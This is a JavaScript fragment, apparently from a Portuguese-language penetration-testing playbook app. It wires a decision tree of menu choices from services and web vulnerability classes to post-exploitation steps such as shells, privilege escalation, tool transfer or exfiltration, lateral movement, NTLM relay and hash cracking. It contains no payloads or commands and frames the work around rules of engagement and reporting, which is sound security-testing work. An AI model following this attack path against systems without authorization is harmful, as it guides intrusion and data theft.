      { label: "22 · SSH", hint: "Credencial", to: "ssh" },
      { label: "21 · FTP", hint: "Anonymous / upload", to: "ftp" },
      { label: "3389 · RDP", hint: "Exposição + cred", to: "rdp" },
      { label: "111 / 2049 · NFS", hint: "showmount", to: "nfs" },
      { label: "161/UDP · SNMP", hint: "community strings", to: "snmp" },
      { label: "25 / 587 · SMTP", hint: "Enum / relay", to: "smtp" },
      { label: "53 · DNS AXFR", hint: "zone transfer", to: "dns-axfr" },
      /* data stores */
      { label: "3306 · MySQL", hint: "DB exposto", to: "mysql" },
      { label: "1433 · MSSQL", hint: "SQL Server", to: "mssql" },
      { label: "5432 · Postgres", hint: "psql", to: "postgres" },
      { label: "6379 · Redis", hint: "sem auth?", to: "redis" },
      { label: "27017 · MongoDB", hint: "listDatabases", to: "mongodb" },
      { label: "9200 · Elasticsearch", hint: "indices abertos", to: "elasticsearch" },
      /* cloud / mobile */
      { label: "AWS metadata / IAM", hint: "169.254.169.254", to: "aws-metadata" },
      { label: "K8s API / kubelet", hint: "6443 · 10250", to: "k8s-exposed" },
      { label: "APK no escopo", hint: "apktool · jadx", to: "android-apk" },
      /* closeout */
      { label: "Já tenho RCE — preciso de shell", hint: "Listener", to: "shell" },
      { label: "Metasploit", hint: "msfconsole · handler", to: "msf" },
      { label: "Achado válido — reportar", hint: "Finding", to: "report" },
    ];
  }

  if (pb.nodes.web) {
    pb.nodes.web.choices = [
      { label: "401 / Basic Auth / pasta protegida", hint: "/protected/ · hydra http-get", to: "web-auth" },
      { label: "Tem login form (POST)", to: "web-auth" },
      { label: "API / OpenAPI / BOLA", to: "web-api" },
      { label: "GraphQL", to: "web-graphql" },
      { label: "JWT", to: "web-jwt" },
      { label: "OAuth / OIDC", to: "web-oauth" },
      { label: "SQLi", to: "web-sqli" },
      { label: "XSS", to: "web-xss" },
      { label: "LFI / path traversal", to: "web-lfi" },
      { label: "Command injection", to: "web-cmdi" },
      { label: "Upload de arquivo", to: "web-upload" },
      { label: "SSRF (URL fetch)", to: "web-ssrf" },
      { label: "XXE / XML", to: "web-xxe" },
      { label: "SSTI", to: "web-ssti" },
      { label: "Deserialização", to: "web-deserial" },
      { label: "Cache poisoning / deception", to: "web-cache" },
      { label: "Nuclei", to: "nuclei" },
      { label: "Burp Suite", hint: "Proxy · Repeater", to: "burp-method" },
      { label: "WordPress", to: "wordpress" },
      { label: "Jenkins", to: "jenkins" },
      { label: "Tomcat /manager", to: "tomcat" },
      { label: "Metasploit", hint: "msfconsole", to: "msf" },
      { label: "RCE — shell / handler", to: "shell" },
      { label: "Provei impacto — reportar", to: "report" },
      { label: "Voltar ao mapa de portas", to: "ports" },
    ];
  }

  if (pb.nodes["web-auth"]) {
    pb.nodes["web-auth"].choices = [
      { label: "Entrei — Nuclei autenticado", hint: "Header Basic", to: "nuclei" },
      { label: "Entrei — remapear app", to: "web" },
      { label: "Cred → Tomcat /manager", hint: "testar reuse", to: "tomcat" },
      { label: "Burp Suite", to: "burp-method" },
      { label: "JWT no fluxo", to: "web-jwt" },
      { label: "OAuth / OIDC", to: "web-oauth" },
      { label: "SQLi no login", to: "web-sqli" },
      { label: "Cred/bypass = finding", to: "report" },
      { label: "Mapa de portas", to: "ports" },
    ];
  }

  if (pb.nodes.shell) {
    pb.nodes.shell.choices = [
      { label: "Metasploit (hub)", to: "msf" },
      { label: "Privesc Linux", to: "privesc-linux" },
      { label: "Privesc Windows", to: "privesc-windows" },
      { label: "Trazer tool / exfil", to: "file-xfer" },
      { label: "Lateral movement", to: "lateral" },
      { label: "Documentar acesso", to: "report" },
      { label: "Ainda há portas no nmap", to: "ports" },
    ];
  }

  if (pb.nodes.smb) {
    pb.nodes.smb.choices = [
      { label: "nxc / NetExec fundo", to: "nxc-smb" },
      { label: "Metasploit (EternalBlue / hub)", to: "msf" },
      { label: "AD hub", to: "ad-attack" },
      { label: "Kerberos / roast", to: "kerberos" },
      { label: "Hash → crack", to: "crack-hash" },
      { label: "Shell / meterpreter", to: "shell" },
      { label: "Share/info sensível — reportar", to: "report" },
      { label: "Mapa de portas", to: "ports" },
    ];
  }

  if (pb.nodes.ssh) {
    pb.nodes.ssh.choices = [
      { label: "Entrei — privesc Linux", to: "privesc-linux" },
      { label: "Entrei — estabilizar shell", to: "shell" },
      { label: "Key/cred → lateral", to: "lateral" },
      { label: "Acesso indevido — reportar", to: "report" },
      { label: "Mapa de portas", to: "ports" },
    ];
  }

  if (pb.nodes.ftp) {
    pb.nodes.ftp.choices = [
      { label: "Upload em dir web — shell", to: "shell" },
      { label: "Arquivo com hash/cred → crack", to: "crack-hash" },
      { label: "Arquivos sensíveis — reportar", to: "report" },
      { label: "Mapa de portas", to: "ports" },
    ];
  }

  if (pb.nodes.rdp) {
    pb.nodes.rdp.choices = [
      { label: "Acesso — privesc Windows", to: "privesc-windows" },
      { label: "Cred → AD hub", to: "ad-attack" },
      { label: "Reportar exposição / acesso", to: "report" },
      { label: "Mapa de portas", to: "ports" },
    ];
  }

  if (pb.nodes.mysql) {
    pb.nodes.mysql.choices = [
      { label: "SQLi web → este DB", to: "web-sqli" },
      { label: "Hashes → crack", to: "crack-hash" },
      { label: "Reportar", to: "report" },
      { label: "Mapa de portas", to: "ports" },
    ];
  }

  if (pb.nodes.mssql) {
    pb.nodes.mssql.choices = [
      { label: "Consegui exec — shell", to: "shell" },
      { label: "Hashes → crack", to: "crack-hash" },
      { label: "Acesso a dados — reportar", to: "report" },
      { label: "Mapa de portas", to: "ports" },
    ];
  }

  if (pb.nodes.report) {
    pb.nodes.report.choices = [
      { label: "Reteste deste finding", to: "retest" },
      { label: "Próximo serviço do nmap", to: "ports" },
      { label: "Recomeçar engajamento", to: "roe" },
    ];
  }

  /* privesc → file-xfer shortcut */
  if (pb.nodes["privesc-linux"]) {
    var pl = pb.nodes["privesc-linux"].choices || [];
    if (!pl.some(function (c) { return c.to === "file-xfer"; })) {
      pl.unshift({ label: "Preciso trazer linpeas/tool", to: "file-xfer" });
      pb.nodes["privesc-linux"].choices = pl;
    }
  }
  if (pb.nodes["privesc-windows"]) {
    var pw = pb.nodes["privesc-windows"].choices || [];
    if (!pw.some(function (c) { return c.to === "file-xfer"; })) {
      pw.unshift({ label: "Preciso trazer winpeas/tool", to: "file-xfer" });
      pb.nodes["privesc-windows"].choices = pw;
    }
  }

  if (pb.nodes["ad-attack"]) {
    var ad = pb.nodes["ad-attack"].choices || [];
    if (!ad.some(function (c) { return c.to === "crack-hash"; })) {
      ad.splice(1, 0, { label: "Hash → crack hub", to: "crack-hash" });
      pb.nodes["ad-attack"].choices = ad;
    }
    if (!ad.some(function (c) { return c.to === "ntlm-relay"; })) {
      ad.splice(2, 0, { label: "NTLM relay (RoE)", to: "ntlm-relay" });
      pb.nodes["ad-attack"].choices = ad;
    }
  }

  /* Fase 1 · prompt 04 — wire paths → KnowledgeEntry */
  if (pb.nodes["web-ssrf"]) pb.nodes["web-ssrf"].knowledgeIds = ["ssrf"];
  if (pb.nodes["web-jwt"]) pb.nodes["web-jwt"].knowledgeIds = ["jwt-attacks"];
  if (pb.nodes["web-sqli"]) pb.nodes["web-sqli"].knowledgeIds = ["sqli"];
})();
